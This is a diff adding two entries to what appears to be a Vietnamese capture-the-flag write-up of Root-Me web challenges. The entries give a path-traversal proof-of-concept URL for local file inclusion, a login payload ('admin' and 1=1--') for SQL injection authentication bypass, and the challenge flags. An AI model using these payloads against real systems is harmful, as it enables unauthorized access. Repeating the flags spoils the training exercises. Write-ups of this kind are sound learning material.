@@ -186,7 +186,22 @@ if ( isset($_POST["username"]) && isset($_POST["password"]) ){
 
 ###18. Local File Inclusion
 
+**Link:** [http://challenge01.root-me.org/web-serveur/ch16/](http://challenge01.root-me.org/web-serveur/ch16/)
+
+Đây là một bài LFI ở mức "sách giáo khoa".
+
+PoC: _http://challenge01.root-me.org/web-serveur/ch16/?files=../admin_
+
+**Flag:** _OpbNJ60xYpvAQU8_
+
 ###19. SQL Injection - authentication
+
+**Link:** [http://challenge01.root-me.org/web-serveur/ch9/](http://challenge01.root-me.org/web-serveur/ch9/)
+
+Bài SQL Injection này cũng ở mức "sách giáo khoa".
+Gửi request lên với các biến _login=admin' and 1=1-- &password=admin' and 1=1--_
+
+**Flag:** _t0\_W34k!$_
 
 ###20. SQL Injection - string
 
